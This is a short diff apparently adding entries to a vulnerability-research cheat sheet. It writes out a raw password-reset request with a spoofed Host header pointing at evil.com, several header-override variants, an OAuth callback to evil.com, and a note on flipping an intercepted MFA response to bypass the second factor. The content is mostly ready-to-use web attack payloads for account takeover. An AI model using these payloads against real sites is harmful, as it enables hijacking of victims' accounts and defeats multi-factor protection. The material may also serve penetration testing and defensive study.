@@ -17,3 +17,16 @@ echo "=== $H ==="
 email=victim@company.com
 for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
 https://evil.com/oauth/callback?code=AUTH_CODE
+# ─── host-header poisoning for password reset (skraft9/vulnerability-research) ───
+# Reset link built from Host header — attacker gets the reset link:
+POST /api/reset-password HTTP/1.1
+Host: evil.com
+Content-Type: application/json
+{"email":"victim@target.com"}
+# Alternate header the same trick abuses:
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+# ─── MFA response tampering (skraft9/vulnerability-research) ───
+# Proxy intercept: {success:false, mfa_required:true} → flip to {success:true, status:200}
+# Some SPAs trust response.data.success blindly
